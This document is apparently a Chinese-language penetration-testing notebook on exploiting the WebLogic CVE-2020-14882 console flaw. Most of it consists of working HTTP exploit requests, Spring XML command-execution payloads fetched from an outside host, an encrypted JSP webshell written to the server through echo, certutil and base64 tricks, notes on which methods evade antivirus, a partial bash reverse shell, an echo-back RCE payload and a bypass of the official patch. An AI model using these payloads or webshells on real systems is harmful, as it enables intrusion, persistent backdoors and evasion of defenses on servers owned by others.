### 使用docker搭建环境 

参考链接：

https://github.com/jas502n/CVE-2020-14882

https://mp.weixin.qq.com/s/_zNr5Jw7tH_6XlUdudhMhA

#### weblogic版本为：10.3.6.0

```
因为com.tangosol.coherence.mvel2.sh.ShellSession这个gadget，只存在于weblogic 12，weblogic10 并没有这个gadget（没有包），所以无法使用
```

![image-20201030215623287](/img/image-20201030215623287.png)

需要使用`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`

#### POC 如下：

```
POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
Host: 139.9.182.45:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: ADMINCONSOLESESSION=Qf65fcYKvDGBh307GBk0ncp2JCPT2MyZSRT3B2CFlTm8hHt4jWbn!906876441
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 160

_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://139.9.182.45:81/poc1.xml")
```

![image-20201030221311751](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201030221311751.png)

![image-20201030221256774](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201030221256774.png)

### poc1.xml中的内容如下：

```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>touch</value>
        <value>/tmp/12345</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

如果是windows系统的话 poc.xml的内容如下：

```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[calc]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```



#### 写shell

默认情况下当前路径：

```
ROOT_PATH= C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\
```

当时如果要写Shell的话，路径需要写为：

```
Shell_path= ../../../wlserver/server/lib/consoleapp/webapp/images/xxx.jsp  
如果 images写进去了但是访问不了的话 可以写在和images的同级目录下 css下
我的10.3.6的路径时：
../../../wlserver_10.3/server/lib/consoleapp/webapp/images/xxx.jsp
../../../wlserver_10.3/server/lib/consoleapp/webapp/css/xxx.jsp
```

本地测试如下：

```
weblogic当前目录：C:\Oracle\Middleware\user_projects\domains\base_domain\

shell的路径：C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\images\1.jsp
```

#### 方法1：echo写文件

这是最原始的方法，比较折腾人。如果你以为只要 `echo 1 > 1.txt` 这样写入，就图样了。Windows 下的 `cmd echo` 写入需要特殊字符转义，如下：

```
< --- ^<
> --- ^>
/ --- ^/
+ --- ^+
```

这里应该是针对在web端请求包命令执行写文件，所以需要url编码。我这里是让服务器加载远端xml，所有没有进行Url编码也可以。另外，由于 web 服务器自动转码 `URL编码`，把原本不是 URL 编码的字符转码了，导致写入的文件错误，所以还需对下面的字符转码：

```
% --> %25    # --> %23    @ --> %40
+ --> %2b    | --> %7c    & --> ^%26
```

poc.xml 如下

```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[echo ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^>^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^>^<%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> >../../../wlserver_10.3/server/lib/consoleapp/webapp/images/xxx.jsp]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

结果：

![image-20201118175217086](D:\学习资料\markdown笔记\img\image-20201118175217086.png)

写入文件成功，而且杀软不拦截

Shell连接：

![image-20201118175436535](D:\学习资料\markdown笔记\img\image-20201118175436535.png)

#### 方法二：powershell base64 写文件

```
$data = 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
```

![image-20201118175909467](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201118175909467.png)

但是本地试了下 冰鞋的马写入解码的时候会自动换行，造成无法解析，目前没搜到解决方法

而且powershell写入时 火绒会拦截

#### 方法三：certutil base64 解码写入 （火绒不拦截）

先准备冰鞋的jspx的马 然后在burp的encode模块进行base64编码

![image-20201118181827462](D:\学习资料\markdown笔记\img\image-20201118181827462.png)

将base64编码后的马写入 txt内

poc2.xml:

```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">  
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">  
    <constructor-arg>  
      <list>  
        <value>cmd</value>  
        <value>/c</value>  
        <value><![CDATA[echo PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIvPjxqc3A6ZGVjbGFyYXRpb24+IGNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX08L2pzcDpkZWNsYXJhdGlvbj48anNwOnNjcmlwdGxldD5pZihyZXF1ZXN0LmdldFBhcmFtZXRlcigicGFzcyIpIT1udWxsKXtTdHJpbmcgaz0oIiIrVVVJRC5yYW5kb21VVUlEKCkpLnJlcGxhY2UoIi0iLCIiKS5zdWJzdHJpbmcoMTYpO3Nlc3Npb24ucHV0VmFsdWUoInUiLGspO291dC5wcmludChrKTtyZXR1cm47fUNpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KDIsbmV3IFNlY3JldEtleVNwZWMoKHNlc3Npb24uZ2V0VmFsdWUoInUiKSsiIikuZ2V0Qnl0ZXMoKSwiQUVTIikpO25ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGMuZG9GaW5hbChuZXcgc3VuLm1pc2MuQkFTRTY0RGVjb2RlcigpLmRlY29kZUJ1ZmZlcihyZXF1ZXN0LmdldFJlYWRlcigpLnJlYWRMaW5lKCkpKSkubmV3SW5zdGFuY2UoKS5lcXVhbHMocGFnZUNvbnRleHQpOzwvanNwOnNjcmlwdGxldD48L2pzcDpyb290Pg== >../../../wlserver_10.3/server/lib/consoleapp/webapp/images/xxx.txt]]></value>  
      </list>  
    </constructor-arg>  
  </bean>  
</beans>  
```

然后使用certutil进行解码到 xxx.jspx中

Poc3.xml

```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"> 
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start"> 
    <constructor-arg> 
      <list> 
        <value>cmd</value> 
        <value>/c</value> 
        <value><![CDATA[certutil.exe -decode ../../../wlserver_10.3/server/lib/consoleapp/webapp/images/xxx.txt ../../../wlserver_10.3/server/lib/consoleapp/webapp/images/xxx.jspx]]></value> 
      </list> 
    </constructor-arg> 
  </bean> 
</beans> 
```

![image-20201118182130772](D:\学习资料\markdown笔记\img\image-20201118182130772.png)

使用冰鞋连接正常 http://192.168.42.101:7001/console/images/xxx.jspx

### 10.3.6 版本（linux）

使用 echo xxx |base64 -d > xxx.jsp 写入文件

poc.xml

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"> 
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start"> 
    <constructor-arg> 
      <list> 
        <value>/bin/bash</value> 
        <value>-c</value> 
        <value><![CDATA[echo PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIvPjxqc3A6ZGVjbGFyYXRpb24+IGNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX08L2pzcDpkZWNsYXJhdGlvbj48anNwOnNjcmlwdGxldD5pZihyZXF1ZXN0LmdldFBhcmFtZXRlcigicGFzcyIpIT1udWxsKXtTdHJpbmcgaz0oIiIrVVVJRC5yYW5kb21VVUlEKCkpLnJlcGxhY2UoIi0iLCIiKS5zdWJzdHJpbmcoMTYpO3Nlc3Npb24ucHV0VmFsdWUoInUiLGspO291dC5wcmludChrKTtyZXR1cm47fUNpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KDIsbmV3IFNlY3JldEtleVNwZWMoKHNlc3Npb24uZ2V0VmFsdWUoInUiKSsiIikuZ2V0Qnl0ZXMoKSwiQUVTIikpO25ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGMuZG9GaW5hbChuZXcgc3VuLm1pc2MuQkFTRTY0RGVjb2RlcigpLmRlY29kZUJ1ZmZlcihyZXF1ZXN0LmdldFJlYWRlcigpLnJlYWRMaW5lKCkpKSkubmV3SW5zdGFuY2UoKS5lcXVhbHMocGFnZUNvbnRleHQpOzwvanNwOnNjcmlwdGxldD48L2pzcDpyb290Pg== |base64 -d > ../../../wlserver_10.3/server/lib/consoleapp/webapp/css/xxx.jspx]]></value> 
      </list> 
    </constructor-arg> 
  </bean> 
</beans> 
```

如果需要反弹shell的话

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"> 
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start"> 
    <constructor-arg> 
      <list> 
        <value>/bin/bash</value> 
        <value>-c</value> 
        <value><![CDATA[bash -i >& /dev/tcp......]]></value> 
      </list> 
    </constructor-arg> 
  </bean> 
</beans> 
```



### weblogic版本为: 12时

直接利用Poc:

```
POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
Host: 172.16.242.134:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime('calc.exe');");
```

```
GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP/1.1
Host: 192.168.3.189:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ADM
Upgrade-Insecure-Requests: 1
```

#### 可回显POC如下：

```
GET /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();') HTTP/1.1
Host: 185.193.176.170:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
cmd:whoami && dir
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

![image-20201102144406997](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201102144406997.png)

#### 写文件：

![image-20201102145953121](C:\Users\shy\AppData\Roaming\Typora\typora-user-images\image-20201102145953121.png)







### weblogic（cve-2020-14882）补丁绕过

官方补丁如下：如此简单粗暴

```
private static final String[] IllegalUrl = new String[]{";", "%252E%252E", "%2E%2E", "..", "%3C", "%3E", "<", ">"};
```

#### 绕过如下：直接大写转小写

```
%252E%252E%252F to %252e%252e%252f
/console/images/%252e%252e%252fconsole.portal
```

